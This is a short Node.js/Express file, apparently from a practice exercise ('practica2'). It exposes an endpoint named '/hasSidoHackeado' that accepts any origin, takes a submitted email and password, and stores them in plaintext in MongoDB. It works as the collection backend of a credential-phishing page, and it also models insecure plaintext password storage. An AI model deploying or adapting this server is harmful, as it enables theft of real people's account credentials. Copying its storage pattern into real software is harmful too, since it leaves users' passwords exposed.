const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

mongoose.connect('mongodb://localhost:27017/practica2',{
    useNewUrlParser: true,
    useUnifiedTopology: true
});

const datos =  new  mongoose.Schema({
    email: String,
    password: String
})

const usuario =  mongoose.model('usuario', datos);

app.post("/hasSidoHackeado", async ( req , res ) => {
    const { email , password } = req.body;
    const usuarioBD = new usuario({ email , password });
    await usuarioBD.save();
    res.status(201).send("Informacion  guardada");
});

app.listen(3000,  () => {
    console.log("Servidor escuchando en el puerto 3000");
})
